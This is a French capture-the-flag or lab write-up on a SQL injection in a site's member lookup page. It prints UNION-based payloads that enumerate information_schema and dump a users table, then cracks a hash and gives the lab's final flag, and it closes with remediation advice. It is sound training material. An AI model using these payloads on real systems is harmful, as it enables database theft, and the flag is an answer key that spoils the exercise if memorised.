# SQL injection 1

#### Page: _/index.php?page=member_


## Déscription de la vulnerabilité:
Taper n'importe quelle chaîne de caractères dans le champ `id` renvoie une erreur
indiquant l'utilisation d'une base de donnée SQL côté serveur.  
La requête est réalisée en methode GET et les paramêtres sont passés dans l'URL:
```
/?page=member&id=lala&Submit=Submit#
```

On teste `1 OR 1=1` comme valeur d'`id` et on obtient:
```
ID: 1 or 1=1
First name: Barack Hussein
Surname : Obama

ID: 1 or 1=1
First name: Adolf
Surname : Hitler

ID: 1 or 1=1
First name: Joseph
Surname : Staline

ID: 1 or 1=1
First name: Flag
Surname : GetThe
```

Cela indique que ce que l'on passe dans l'`id` est interprêté côté serveur comme du SQL.
On détermine également que deux colonnes sont renvoyées par la requête SQL.

On utilise `information_schema` qui permet de récuperer des leta data de la
base de donnees SQL.

L'injection SQL suivante nous permet d'obtenir les schémas et les tables de la base:
```
/?page=member&id=1 union select table_schema, table_name from information_schema.tables&Submit=Submit#
```
 On détermine ainsi les tables:
 ```
 db_default.Member_Brute_Force
 Member_Sql_Injection.users
 Member_guestbook.guestbook
 Member_images.list_images
 Member_survey.vote_dbs
 ```

A l'aide de l'injéction suivante, on récupére les colonnes de l'ensemble des tables:
```
/?page=member&id=1 union select table_name, column_name from information_schema.columns &Submit=Submit#
```

On utilise la commande `UNION` de SQL qui permet de mettre bout-à-bout les résultats de plusieurs requêtes.

Ainsi, on détermine que la base de données ressemble à:  
Table `db_default`:
```
id
username
password
```

Table `users`:
```
user_id
first_name
last_name
town
country
planet
Commentaire
countersign
```

Table `guestbook`:
```
comment
name
id_comment
```

Table `list_images`:
```
id
url
title
comment
```

Table `vote_dbs`:
```
id_vote
vote
nb_vote
subject
```

On teste l'ensemble des colonnes pour ` Member_Sql_Injection.users`.
Avec:
```
/?page=member&id=1 union select Commentaire, countersign from%20 Member_Sql_Injection.users &Submit=Submit#
```
On finit par tomber sur:
```
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

`5ff9d0165b4f92b14994e5c685cdce28` est un hash md5 de `FourtyTwo`.
On passe `FourtyTwo` en `lowercase` puis on hash en sha256:
```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Scénario d'attaque:
Une vulnerabilité de type injection SQL peut permettre d'accéder ou de
modifier une base de données de type SQL.
Dans certains cas, comme celui ci, la faille permet de récupérer l'intégralité
du contenu de la base, dont les idendifiants et les mots de passe des utilisateurs
du site.


## Correctifs:
- Utiliser `mysqli_real_escape_string()` afin d'échapper les caractères spéciaux
provenant des entrées utilisateur.
- Utiliser des procédures stockées, qui sont des instructions SQL précompilées,
 à la place du SQL dynamique.
- La plupart des ORM utilisent des systèmes de requêtes préparées dans lesquelles
le SGBD se charge alors de l'echappement et du contrôle des requêtes.
